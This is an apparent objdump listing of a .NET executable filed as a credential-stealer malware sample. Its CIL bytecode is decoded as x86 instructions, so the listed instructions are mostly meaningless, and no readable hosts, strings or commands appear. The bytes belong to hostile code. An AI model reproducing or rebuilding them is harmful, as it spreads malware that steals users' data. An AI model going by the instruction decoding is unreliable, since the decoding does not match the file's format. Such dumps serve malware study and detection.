
malware_samples/stealer/d1cf2bed3134dcfa6cc837d263f99ab2743d7b770f801be92b172f441b6e0ae5.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	c0 2b 00             	shrb   $0x0,(%ebx)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 48 23 00       	add    $0x234800,%eax
  402013:	00 40 08             	add    %al,0x8(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	de ad be ef 1b 30    	fisubrs 0x301befbe(%ebp)
  402056:	04 00                	add    $0x0,%al
  402058:	30 02                	xor    %al,(%edx)
  40205a:	00 00                	add    %al,(%eax)
  40205c:	01 00                	add    %eax,(%eax)
  40205e:	00 11                	add    %dl,(%ecx)
  402060:	1f                   	pop    %ds
  402061:	1c 28                	sbb    $0x28,%al
  402063:	03 00                	add    (%eax),%eax
  402065:	00 0a                	add    %cl,(%edx)
  402067:	72 01                	jb     0x40206a
  402069:	00 00                	add    %al,(%eax)
  40206b:	70 28                	jo     0x402095
  40206d:	04 00                	add    $0x0,%al
  40206f:	00 0a                	add    %cl,(%edx)
  402071:	13 19                	adc    (%ecx),%ebx
  402073:	12 19                	adc    (%ecx),%bl
  402075:	fe                   	(bad)
  402076:	16                   	push   %ss
  402077:	06                   	push   %es
  402078:	00 00                	add    %al,(%eax)
  40207a:	01 6f 05             	add    %ebp,0x5(%edi)
  40207d:	00 00                	add    %al,(%eax)
  40207f:	0a 28                	or     (%eax),%ch
  402081:	06                   	push   %es
  402082:	00 00                	add    %al,(%eax)
  402084:	0a 28                	or     (%eax),%ch
  402086:	07                   	pop    %es
  402087:	00 00                	add    %al,(%eax)
  402089:	0a 0a                	or     (%edx),%cl
  40208b:	06                   	push   %es
  40208c:	28 08                	sub    %cl,(%eax)
  40208e:	00 00                	add    %al,(%eax)
  402090:	0a 26                	or     (%esi),%ah
  402092:	73 09                	jae    0x40209d
  402094:	00 00                	add    %al,(%eax)
  402096:	0a 0b                	or     (%ebx),%cl
  402098:	28 0a                	sub    %cl,(%edx)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	0a 6f 0b             	or     0xb(%edi),%ch
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4020a4:	19 17                	sbb    %edx,(%edi)
  4020a6:	73 0c                	jae    0x4020b4
  4020a8:	00 00                	add    %al,(%eax)
  4020aa:	0a 0d 09 6f 0d 00    	or     0xd6f09,%cl
  4020b0:	00 0a                	add    %cl,(%edx)
  4020b2:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  4020b5:	1f                   	pop    %ds
  4020b6:	ec                   	in     (%dx),%al
  4020b7:	6a 18                	push   $0x18
  4020b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ba:	0e                   	push   %cs
  4020bb:	00 00                	add    %al,(%eax)
  4020bd:	0a 26                	or     (%esi),%ah
  4020bf:	1f                   	pop    %ds
  4020c0:	14 8d                	adc    $0x8d,%al
  4020c2:	12 00                	adc    (%eax),%al
  4020c4:	00 01                	add    %al,(%ecx)
  4020c6:	13 05 09 11 05 16    	adc    0x16051109,%eax
  4020cc:	1f                   	pop    %ds
  4020cd:	14 6f                	adc    $0x6f,%al
  4020cf:	0f 00 00             	sldt   (%eax)
  4020d2:	0a 26                	or     (%esi),%ah
  4020d4:	1a 8d 12 00 00 01    	sbb    0x1000012(%ebp),%cl
  4020da:	25 d0 01 00 00       	and    $0x1d0,%eax
  4020df:	04 28                	add    $0x28,%al
  4020e1:	11 00                	adc    %eax,(%eax)
  4020e3:	00 0a                	add    %cl,(%edx)
  4020e5:	13 06                	adc    (%esi),%eax
  4020e7:	17                   	pop    %ss
  4020e8:	13 07                	adc    (%edi),%eax
  4020ea:	16                   	push   %ss
  4020eb:	13 08                	adc    (%eax),%ecx
  4020ed:	2b 1a                	sub    (%edx),%ebx
  4020ef:	11 05 1f 10 11 08    	adc    %eax,0x811101f
  4020f5:	58                   	pop    %eax
  4020f6:	91                   	xchg   %eax,%ecx
  4020f7:	11 06                	adc    %eax,(%esi)
  4020f9:	11 08                	adc    %ecx,(%eax)
  4020fb:	91                   	xchg   %eax,%ecx
  4020fc:	2e 05 16 13 07 2b    	cs add $0x2b071316,%eax
  402102:	0b 11                	or     (%ecx),%edx
  402104:	08 17                	or     %dl,(%edi)
  402106:	58                   	pop    %eax
  402107:	13 08                	adc    (%eax),%ecx
  402109:	11 08                	adc    %ecx,(%eax)
  40210b:	1a 32                	sbb    (%edx),%dh
  40210d:	e1 11                	loope  0x402120
  40210f:	07                   	pop    %es
  402110:	2d 05 dd 78 01       	sub    $0x178dd05,%eax
  402115:	00 00                	add    %al,(%eax)
  402117:	11 05 16 28 12 00    	adc    %eax,0x122816
  40211d:	00 0a                	add    %cl,(%edx)
  40211f:	13 09                	adc    (%ecx),%ecx
  402121:	11 05 1e 28 13 00    	adc    %eax,0x13281e
  402127:	00 0a                	add    %cl,(%edx)
  402129:	13 0a                	adc    (%edx),%ecx
  40212b:	11 09                	adc    %ecx,(%ecx)
  40212d:	16                   	push   %ss
  40212e:	6a 31                	push   $0x31
  402130:	0a 11                	or     (%ecx),%dl
  402132:	09 11                	or     %edx,(%ecx)
  402134:	04 1f                	add    $0x1f,%al
  402136:	64 6a 59             	fs push $0x59
  402139:	32 05 dd 4f 01 00    	xor    0x14fdd,%al
  40213f:	00 11                	add    %dl,(%ecx)
  402141:	0a 16                	or     (%esi),%dl
  402143:	31 06                	xor    %eax,(%esi)
  402145:	11 0a                	adc    %ecx,(%edx)
  402147:	1f                   	pop    %ds
  402148:	64 31 05 dd 3f 01 00 	xor    %eax,%fs:0x13fdd
  40214f:	00 09                	add    %cl,(%ecx)
  402151:	11 09                	adc    %ecx,(%ecx)
  402153:	16                   	push   %ss
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	0e                   	push   %cs
  402156:	00 00                	add    %al,(%eax)
  402158:	0a 26                	or     (%esi),%ah
  40215a:	09 1a                	or     %ebx,(%edx)
  40215c:	6a 17                	push   $0x17
  40215e:	6f                   	outsl  %ds:(%esi),(%dx)
  40215f:	0e                   	push   %cs
  402160:	00 00                	add    %al,(%eax)
  402162:	0a 26                	or     (%esi),%ah
  402164:	16                   	push   %ss
  402165:	13 0b                	adc    (%ebx),%ecx
  402167:	38 d6                	cmp    %dl,%dh
  402169:	00 00                	add    %al,(%eax)
  40216b:	00 1a                	add    %bl,(%edx)
  40216d:	8d 12                	lea    (%edx),%edx
  40216f:	00 00                	add    %al,(%eax)
  402171:	01 13                	add    %edx,(%ebx)
  402173:	0c 09                	or     $0x9,%al
  402175:	11 0c 16             	adc    %ecx,(%esi,%edx,1)
  402178:	1a 6f 0f             	sbb    0xf(%edi),%ch
  40217b:	00 00                	add    %al,(%eax)
  40217d:	0a 26                	or     (%esi),%ah
  40217f:	11 0c 16             	adc    %ecx,(%esi,%edx,1)
  402182:	28 13                	sub    %dl,(%ebx)
  402184:	00 00                	add    %al,(%eax)
  402186:	0a 13                	or     (%ebx),%dl
  402188:	0d 11 0d 8d 12       	or     $0x128d0d11,%eax
  40218d:	00 00                	add    %al,(%eax)
  40218f:	01 13                	add    %edx,(%ebx)
  402191:	0e                   	push   %cs
  402192:	09 11                	or     %edx,(%ecx)
  402194:	0e                   	push   %cs
  402195:	16                   	push   %ss
  402196:	11 0d 6f 0f 00 00    	adc    %ecx,0xf6f
  40219c:	0a 26                	or     (%esi),%ah
  40219e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4021a1:	00 0a                	add    %cl,(%edx)
  4021a3:	11 0e                	adc    %ecx,(%esi)
  4021a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a6:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021ab:	0f 1e 8d 12 00 00 01 	nopl   0x1000012(%ebp)
  4021b2:	13 10                	adc    (%eax),%edx
  4021b4:	09 11                	or     %edx,(%ecx)
  4021b6:	10 16                	adc    %dl,(%esi)
  4021b8:	1e                   	push   %ds
  4021b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ba:	0f 00 00             	sldt   (%eax)
  4021bd:	0a 26                	or     (%esi),%ah
  4021bf:	11 10                	adc    %edx,(%eax)
  4021c1:	16                   	push   %ss
  4021c2:	28 12                	sub    %dl,(%edx)
  4021c4:	00 00                	add    %al,(%eax)
  4021c6:	0a 13                	or     (%ebx),%dl
  4021c8:	11 06                	adc    %eax,(%esi)
  4021ca:	11 0f                	adc    %ecx,(%edi)
  4021cc:	28 07                	sub    %al,(%edi)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	0a 13                	or     (%ebx),%dl
  4021d2:	12 11                	adc    (%ecx),%dl
  4021d4:	12 18                	adc    (%eax),%bl
  4021d6:	18 73 0c             	sbb    %dh,0xc(%ebx)
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	0a 13                	or     (%ebx),%dl
  4021dd:	13 20                	adc    (%eax),%esp
  4021df:	00 40 01             	add    %al,0x1(%eax)
  4021e2:	00 8d 12 00 00 01    	add    %cl,0x1000012(%ebp)
  4021e8:	13 14 11             	adc    (%ecx,%edx,1),%edx
  4021eb:	11 13                	adc    %edx,(%ebx)
  4021ed:	15 2b 30 11 14       	adc    $0x1411302b,%eax
  4021f2:	8e 69 6a             	mov    0x6a(%ecx),%gs
  4021f5:	11 15 28 16 00 00    	adc    %edx,0x1628
  4021fb:	0a 69 13             	or     0x13(%ecx),%ch
  4021fe:	16                   	push   %ss
  4021ff:	09 11                	or     %edx,(%ecx)
  402201:	14 16                	adc    $0x16,%al
  402203:	11 16                	adc    %edx,(%esi)
  402205:	6f                   	outsl  %ds:(%esi),(%dx)
  402206:	0f 00 00             	sldt   (%eax)
  402209:	0a 13                	or     (%ebx),%dl
  40220b:	17                   	pop    %ss
  40220c:	11 13                	adc    %edx,(%ebx)
  40220e:	11 14 16             	adc    %edx,(%esi,%edx,1)
  402211:	11 17                	adc    %edx,(%edi)
  402213:	6f                   	outsl  %ds:(%esi),(%dx)
  402214:	17                   	pop    %ss
  402215:	00 00                	add    %al,(%eax)
  402217:	0a 11                	or     (%ecx),%dl
  402219:	15 11 17 6a 59       	adc    $0x596a1711,%eax
  40221e:	13 15 11 15 16 6a    	adc    0x6a161511,%edx
  402224:	30 ca                	xor    %cl,%dl
  402226:	de 0c 11             	fimuls (%ecx,%edx,1)
  402229:	13 2c 07             	adc    (%edi,%eax,1),%ebp
  40222c:	11 13                	adc    %edx,(%ebx)
  40222e:	6f                   	outsl  %ds:(%esi),(%dx)
  40222f:	18 00                	sbb    %al,(%eax)
  402231:	00 0a                	add    %cl,(%edx)
  402233:	dc 07                	faddl  (%edi)
  402235:	11 12                	adc    %edx,(%edx)
  402237:	6f                   	outsl  %ds:(%esi),(%dx)
  402238:	19 00                	sbb    %eax,(%eax)
  40223a:	00 0a                	add    %cl,(%edx)
  40223c:	11 0b                	adc    %ecx,(%ebx)
  40223e:	17                   	pop    %ss
  40223f:	58                   	pop    %eax
  402240:	13 0b                	adc    (%ebx),%ecx
  402242:	11 0b                	adc    %ecx,(%ebx)
  402244:	11 0a                	adc    %ecx,(%edx)
  402246:	3f                   	aas
  402247:	21 ff                	and    %edi,%edi
  402249:	ff                   	(bad)
  40224a:	ff                   	lcall  (bad)
  40224b:	de 0a                	fimuls (%edx)
  40224d:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  402250:	09 6f 18             	or     %ebp,0x18(%edi)
  402253:	00 00                	add    %al,(%eax)
  402255:	0a dc                	or     %ah,%bl
  402257:	07                   	pop    %es
  402258:	6f                   	outsl  %ds:(%esi),(%dx)
  402259:	1a 00                	sbb    (%eax),%al
  40225b:	00 0a                	add    %cl,(%edx)
  40225d:	13 1a                	adc    (%edx),%ebx
  40225f:	2b 10                	sub    (%eax),%edx
  402261:	12 1a                	adc    (%edx),%bl
  402263:	28 1b                	sub    %bl,(%ebx)
  402265:	00 00                	add    %al,(%eax)
  402267:	0a 13                	or     (%ebx),%dl
  402269:	18 11                	sbb    %dl,(%ecx)
  40226b:	18 28                	sbb    %ch,(%eax)
  40226d:	02 00                	add    (%eax),%al
  40226f:	00 06                	add    %al,(%esi)
  402271:	12 1a                	adc    (%edx),%bl
  402273:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402276:	00 0a                	add    %cl,(%edx)
  402278:	2d e7 de 0e 12       	sub    $0x120edee7,%eax
  40227d:	1a fe                	sbb    %dh,%bh
  40227f:	16                   	push   %ss
  402280:	02 00                	add    (%eax),%al
  402282:	00 1b                	add    %bl,(%ebx)
  402284:	6f                   	outsl  %ds:(%esi),(%dx)
  402285:	18 00                	sbb    %al,(%eax)
  402287:	00 0a                	add    %cl,(%edx)
  402289:	dc de                	(bad)
  40228b:	03 26                	add    (%esi),%esp
  40228d:	de 00                	fiadds (%eax)
  40228f:	2a 41 64             	sub    0x64(%ecx),%al
  402292:	00 00                	add    %al,(%eax)
  402294:	02 00                	add    (%eax),%al
  402296:	00 00                	add    %al,(%eax)
  402298:	7e 01                	jle    0x40229b
  40229a:	00 00                	add    %al,(%eax)
  40229c:	4a                   	dec    %edx
  40229d:	00 00                	add    %al,(%eax)
  40229f:	00 c8                	add    %cl,%al
  4022a1:	01 00                	add    %eax,(%eax)
  4022a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4022a6:	00 00                	add    %al,(%eax)
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	00 00                	add    %al,(%eax)
  4022ac:	02 00                	add    (%eax),%al
  4022ae:	00 00                	add    %al,(%eax)
  4022b0:	4c                   	dec    %esp
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	00 a1 01 00 00 ed    	add    %ah,-0x12ffffff(%ecx)
  4022b9:	01 00                	add    %eax,(%eax)
  4022bb:	00 0a                	add    %cl,(%edx)
  4022bd:	00 00                	add    %al,(%eax)
  4022bf:	00 00                	add    %al,(%eax)
  4022c1:	00 00                	add    %al,(%eax)
  4022c3:	00 02                	add    %al,(%edx)
  4022c5:	00 00                	add    %al,(%eax)
  4022c7:	00 ff                	add    %bh,%bh
  4022c9:	01 00                	add    %eax,(%eax)
  4022cb:	00 1d 00 00 00 1c    	add    %bl,0x1c000000
  4022d1:	02 00                	add    (%eax),%al
  4022d3:	00 0e                	add    %cl,(%esi)
	...
  4022e1:	00 00                	add    %al,(%eax)
  4022e3:	00 2c 02             	add    %ch,(%edx,%eax,1)
  4022e6:	00 00                	add    %al,(%eax)
  4022e8:	2c 02                	sub    $0x2,%al
  4022ea:	00 00                	add    %al,(%eax)
  4022ec:	03 00                	add    (%eax),%eax
  4022ee:	00 00                	add    %al,(%eax)
  4022f0:	01 00                	add    %eax,(%eax)
  4022f2:	00 01                	add    %al,(%ecx)
  4022f4:	1b 30                	sbb    (%eax),%esi
  4022f6:	02 00                	add    (%eax),%al
  4022f8:	2f                   	das
  4022f9:	00 00                	add    %al,(%eax)
  4022fb:	00 02                	add    %al,(%edx)
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	11 73 1d             	adc    %esi,0x1d(%ebx)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 0b                	or     (%ebx),%cl
  402306:	07                   	pop    %es
  402307:	02 6f 1e             	add    0x1e(%edi),%ch
  40230a:	00 00                	add    %al,(%eax)
  40230c:	0a 07                	or     (%edi),%al
  40230e:	02 28                	add    (%eax),%ch
  402310:	1f                   	pop    %ds
  402311:	00 00                	add    %al,(%eax)
  402313:	0a 6f 20             	or     0x20(%edi),%ch
  402316:	00 00                	add    %al,(%eax)
  402318:	0a 07                	or     (%edi),%al
  40231a:	17                   	pop    %ss
  40231b:	6f                   	outsl  %ds:(%esi),(%dx)
  40231c:	21 00                	and    %eax,(%eax)
  40231e:	00 0a                	add    %cl,(%edx)
  402320:	07                   	pop    %es
  402321:	0a 06                	or     (%esi),%al
  402323:	28 22                	sub    %ah,(%edx)
  402325:	00 00                	add    %al,(%eax)
  402327:	0a 26                	or     (%esi),%ah
  402329:	de 03                	fiadds (%ebx)
  40232b:	26 de 00             	fiadds %es:(%eax)
  40232e:	2a 00                	sub    (%eax),%al
  402330:	01 10                	add    %edx,(%eax)
  402332:	00 00                	add    %al,(%eax)
  402334:	00 00                	add    %al,(%eax)
  402336:	00 00                	add    %al,(%eax)
  402338:	2b 2b                	sub    (%ebx),%ebp
  40233a:	00 03                	add    %al,(%ebx)
  40233c:	01 00                	add    %eax,(%eax)
  40233e:	00 01                	add    %al,(%ecx)
  402340:	1e                   	push   %ds
  402341:	02 28                	add    (%eax),%ch
  402343:	23 00                	and    (%eax),%eax
  402345:	00 0a                	add    %cl,(%edx)
  402347:	2a 42 53             	sub    0x53(%edx),%al
  40234a:	4a                   	dec    %edx
  40234b:	42                   	inc    %edx
  40234c:	01 00                	add    %eax,(%eax)
  40234e:	01 00                	add    %eax,(%eax)
  402350:	00 00                	add    %al,(%eax)
  402352:	00 00                	add    %al,(%eax)
  402354:	0c 00                	or     $0x0,%al
  402356:	00 00                	add    %al,(%eax)
  402358:	76 34                	jbe    0x40238e
  40235a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40235d:	33 30                	xor    (%eax),%esi
  40235f:	33 31                	xor    (%ecx),%esi
  402361:	39 00                	cmp    %eax,(%eax)
  402363:	00 00                	add    %al,(%eax)
  402365:	00 05 00 6c 00 00    	add    %al,0x6c00
  40236b:	00 98 02 00 00 23    	add    %bl,0x23000002(%eax)
  402371:	7e 00                	jle    0x402373
  402373:	00 04 03             	add    %al,(%ebx,%eax,1)
  402376:	00 00                	add    %al,(%eax)
  402378:	e8 03 00 00 23       	call   0x23402380
  40237d:	53                   	push   %ebx
  40237e:	74 72                	je     0x4023f2
  402380:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  402387:	00 ec                	add    %ch,%ah
  402389:	06                   	push   %es
  40238a:	00 00                	add    %al,(%eax)
  40238c:	1c 00                	sbb    $0x0,%al
  40238e:	00 00                	add    %al,(%eax)
  402390:	23 55 53             	and    0x53(%ebp),%edx
  402393:	00 08                	add    %cl,(%eax)
  402395:	07                   	pop    %es
  402396:	00 00                	add    %al,(%eax)
  402398:	10 00                	adc    %al,(%eax)
  40239a:	00 00                	add    %al,(%eax)
  40239c:	23 47 55             	and    0x55(%edi),%eax
  40239f:	49                   	dec    %ecx
  4023a0:	44                   	inc    %esp
  4023a1:	00 00                	add    %al,(%eax)
  4023a3:	00 18                	add    %bl,(%eax)
  4023a5:	07                   	pop    %es
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	28 01                	sub    %al,(%ecx)
  4023aa:	00 00                	add    %al,(%eax)
  4023ac:	23 42 6c             	and    0x6c(%edx),%eax
  4023af:	6f                   	outsl  %ds:(%esi),(%dx)
  4023b0:	62 00                	bound  %eax,(%eax)
  4023b2:	00 00                	add    %al,(%eax)
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	00 00                	add    %al,(%eax)
  4023b8:	02 00                	add    (%eax),%al
  4023ba:	00 01                	add    %al,(%ecx)
  4023bc:	57                   	push   %edi
  4023bd:	15 02 28 09 00       	adc    $0x92802,%eax
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	00 fa                	add    %bh,%dl
  4023c6:	25 33 00 16 00       	and    $0x160033,%eax
  4023cb:	00 01                	add    %al,(%ecx)
  4023cd:	00 00                	add    %al,(%eax)
  4023cf:	00 1d 00 00 00 03    	add    %bl,0x3000000
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	00 01                	add    %al,(%ecx)
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	00 03                	add    %al,(%ebx)
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	00 01                	add    %al,(%ecx)
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	00 23                	add    %ah,(%ebx)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	00 03                	add    %al,(%ebx)
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	00 02                	add    %al,(%edx)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	00 02                	add    %al,(%edx)
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	00 01                	add    %al,(%ecx)
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	00 01                	add    %al,(%ecx)
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	00 02                	add    %al,(%edx)
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	00 00                	add    %al,(%eax)
  402401:	00 0a                	add    %cl,(%edx)
  402403:	00 01                	add    %al,(%ecx)
  402405:	00 00                	add    %al,(%eax)
  402407:	00 00                	add    %al,(%eax)
  402409:	00 06                	add    %al,(%esi)
  40240b:	00 50 00             	add    %dl,0x0(%eax)
  40240e:	49                   	dec    %ecx
  40240f:	00 06                	add    %al,(%esi)
  402411:	00 99 00 79 00 06    	add    %bl,0x6007900(%ecx)
  402417:	00 b9 00 79 00 06    	add    %bh,0x6007900(%ecx)
  40241d:	00 f2                	add    %dh,%dl
  40241f:	00 49 00             	add    %cl,0x0(%ecx)
  402422:	13 00                	adc    (%eax),%eax
  402424:	fe 00                	incb   (%eax)
  402426:	00 00                	add    %al,(%eax)
  402428:	06                   	push   %es
  402429:	00 1a                	add    %bl,(%edx)
  40242b:	01 49 00             	add    %ecx,0x0(%ecx)
  40242e:	06                   	push   %es
  40242f:	00 30                	add    %dh,(%eax)
  402431:	01 49 00             	add    %ecx,0x0(%ecx)
  402434:	06                   	push   %es
  402435:	00 48 01             	add    %cl,0x1(%eax)
  402438:	3e 01 06             	add    %eax,%ds:(%esi)
  40243b:	00 55 01             	add    %dl,0x1(%ebp)
  40243e:	3e 01 06             	add    %eax,%ds:(%esi)
  402441:	00 5f 01             	add    %bl,0x1(%edi)
  402444:	3e 01 06             	add    %eax,%ds:(%esi)
  402447:	00 98 01 7d 01 06    	add    %bl,0x6017d01(%eax)
  40244d:	00 b1 01 9f 01 06    	add    %dh,0x6019f01(%ecx)
  402453:	00 dc                	add    %bl,%ah
  402455:	01 3e                	add    %edi,(%esi)
  402457:	01 06                	add    %eax,(%esi)
  402459:	00 e7                	add    %ah,%bh
  40245b:	01 3e                	add    %edi,(%esi)
  40245d:	01 06                	add    %eax,(%esi)
  40245f:	00 f0                	add    %dh,%al
  402461:	01 3e                	add    %edi,(%esi)
  402463:	01 06                	add    %eax,(%esi)
  402465:	00 fb                	add    %bh,%bl
  402467:	01 3e                	add    %edi,(%esi)
  402469:	01 06                	add    %eax,(%esi)
  40246b:	00 0d 02 3e 01 06    	add    %cl,0x6013e02
  402471:	00 1d 02 49 00 06    	add    %bl,0x6004902
  402477:	00 6c 02 79          	add    %ch,0x79(%edx,%eax,1)
  40247b:	00 06                	add    %al,(%esi)
  40247d:	00 9b 02 79 00 06    	add    %bl,0x6007902(%ebx)
  402483:	00 aa 02 49 00 06    	add    %ch,0x6004902(%edx)
  402489:	00 b0 02 49 00 06    	add    %dh,0x6004902(%eax)
  40248f:	00 d3                	add    %dl,%bl
  402491:	02 49 00             	add    0x0(%ecx),%cl
  402494:	06                   	push   %es
  402495:	00 fc                	add    %bh,%ah
  402497:	02 f0                	add    %al,%dh
  402499:	02 06                	add    (%esi),%al
  40249b:	00 18                	add    %bl,(%eax)
  40249d:	03 49 00             	add    0x0(%ecx),%ecx
  4024a0:	06                   	push   %es
  4024a1:	00 27                	add    %ah,(%edi)
  4024a3:	03 49 00             	add    0x0(%ecx),%ecx
  4024a6:	2f                   	das
  4024a7:	00 3f                	add    %bh,(%edi)
  4024a9:	03 00                	add    (%eax),%eax
  4024ab:	00 0a                	add    %cl,(%edx)
  4024ad:	00 80 03 6d 03 0a    	add    %al,0xa036d03(%eax)
  4024b3:	00 d8                	add    %bl,%al
  4024b5:	03 6d 03             	add    0x3(%ebp),%ebp
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	00 00                	add    %al,(%eax)
  4024bc:	01 00                	add    %eax,(%eax)
  4024be:	00 00                	add    %al,(%eax)
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	01 00                	add    %eax,(%eax)
  4024c4:	01 00                	add    %eax,(%eax)
  4024c6:	00 00                	add    %al,(%eax)
  4024c8:	10 00                	adc    %al,(%eax)
  4024ca:	29 00                	sub    %eax,(%eax)
  4024cc:	31 00                	xor    %eax,(%eax)
  4024ce:	05 00 01 00 01       	add    $0x1000100,%eax
  4024d3:	00 00                	add    %al,(%eax)
  4024d5:	00 00                	add    %al,(%eax)
  4024d7:	00 27                	add    %ah,(%edi)
  4024d9:	02 00                	add    (%eax),%al
  4024db:	00 05 00 01 00 04    	add    %al,0x4000100
  4024e1:	00 13                	add    %dl,(%ebx)
  4024e3:	01 87 02 63 00 54    	add    %eax,0x54006302(%edi)
  4024e9:	20 00                	and    %al,(%eax)
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	00 91 00 57 00 0a    	add    %dl,0xa005700(%ecx)
  4024f3:	00 01                	add    %al,(%ecx)
  4024f5:	00 f4                	add    %dh,%ah
  4024f7:	22 00                	and    (%eax),%al
  4024f9:	00 00                	add    %al,(%eax)
  4024fb:	00 91 00 5c 00 0e    	add    %dl,0xe005c00(%ecx)
  402501:	00 01                	add    %al,(%ecx)
  402503:	00 40 23             	add    %al,0x23(%eax)
  402506:	00 00                	add    %al,(%eax)
  402508:	00 00                	add    %al,(%eax)
  40250a:	86 18                	xchg   %bl,(%eax)
  40250c:	6b 00 13             	imul   $0x13,(%eax),%eax
  40250f:	00 02                	add    %al,(%edx)
  402511:	00 00                	add    %al,(%eax)
  402513:	00 01                	add    %al,(%ecx)
  402515:	00 71 00             	add    %dh,0x0(%ecx)
  402518:	11 00                	adc    %eax,(%eax)
  40251a:	6b 00 17             	imul   $0x17,(%eax),%eax
  40251d:	00 19                	add    %bl,(%ecx)
  40251f:	00 6b 00             	add    %ch,0x0(%ebx)
  402522:	13 00                	adc    (%eax),%eax
  402524:	21 00                	and    %eax,(%eax)
  402526:	0c 01                	or     $0x1,%al
  402528:	1c 00                	sbb    $0x0,%al
  40252a:	31 00                	xor    %eax,(%eax)
  40252c:	1f                   	pop    %ds
  40252d:	01 22                	add    %esp,(%edx)
  40252f:	00 09                	add    %cl,(%ecx)
  402531:	00 27                	add    %ah,(%edi)
  402533:	01 27                	add    %esp,(%edi)
  402535:	00 39                	add    %bh,(%ecx)
  402537:	00 37                	add    %dh,(%edi)
  402539:	01 2b                	add    %ebp,(%ebx)
  40253b:	00 41 00             	add    %al,0x0(%ecx)
  40253e:	4d                   	dec    %ebp
  40253f:	01 2b                	add    %ebp,(%ebx)
  402541:	00 49 00             	add    %cl,0x0(%ecx)
  402544:	6d                   	insl   (%dx),%es:(%edi)
  402545:	01 31                	add    %esi,(%ecx)
  402547:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40254a:	6b 00 13             	imul   $0x13,(%eax),%eax
  40254d:	00 61 00             	add    %ah,0x0(%ecx)
  402550:	ba 01 3d 00 61       	mov    $0x61003d01,%edx
  402555:	00 cf                	add    %cl,%bh
  402557:	01 27                	add    %esp,(%edi)
  402559:	00 69 00             	add    %ch,0x0(%ecx)
  40255c:	6b 00 42             	imul   $0x42,(%eax),%eax
  40255f:	00 81 00 02 02 4b    	add    %al,0x4b020200(%ecx)
  402565:	00 81 00 18 02 4f    	add    %al,0x4f021800(%ecx)
  40256b:	00 81 00 22 02 56    	add    %al,0x56022200(%ecx)
  402571:	00 99 00 6b 00 13    	add    %bl,0x13006b00(%ecx)
  402577:	00 a1 00 c3 02 66    	add    %ah,0x6602c300(%ecx)
  40257d:	00 b9 00 e0 02 6e    	add    %bh,0x6e02e000(%ecx)
  402583:	00 b9 00 e8 02 75    	add    %bh,0x7502e800(%ecx)
  402589:	00 c1                	add    %al,%cl
  40258b:	00 05 03 7c 00 c1    	add    %al,0xc1007c03
  402591:	00 0e                	add    %cl,(%esi)
  402593:	03 81 00 c9 00 1d    	add    0x1d00c900(%ecx),%eax
  402599:	03 87 00 81 00 21    	add    0x21008100(%edi),%eax
  40259f:	03 8d 00 d1 00 33    	add    0x3300d100(%ebp),%ecx
  4025a5:	03 13                	add    (%ebx),%edx
  4025a7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4025aa:	3b 03                	cmp    (%ebx),%eax
  4025ac:	95                   	xchg   %eax,%ebp
  4025ad:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4025b0:	4a                   	dec    %edx
  4025b1:	03 9b 00 14 00 58    	add    0x58001400(%ebx),%ebx
  4025b7:	03 aa 00 14 00 64    	add    0x64001400(%edx),%ebp
  4025bd:	03 af 00 e1 00 6b    	add    0x6b00e100(%edi),%ebp
  4025c3:	00 13                	add    %dl,(%ebx)
  4025c5:	00 e1                	add    %ah,%cl
  4025c7:	00 91 03 e2 00 41    	add    %dl,0x4100e203(%ecx)
  4025cd:	00 9e 03 e7 00 e1    	add    %bl,-0x1eff18fd(%esi)
  4025d3:	00 af 03 e2 00 e1    	add    %ch,-0x1eff1dfd(%edi)
  4025d9:	00 c4                	add    %al,%ah
  4025db:	03 ec                	add    %esp,%ebp
  4025dd:	00 e9                	add    %ch,%cl
  4025df:	00 e0                	add    %ah,%al
  4025e1:	03 f1                	add    %ecx,%esi
  4025e3:	00 09                	add    %cl,(%ecx)
  4025e5:	00 6b 00             	add    %ch,0x0(%ebx)
  4025e8:	13 00                	adc    (%eax),%eax
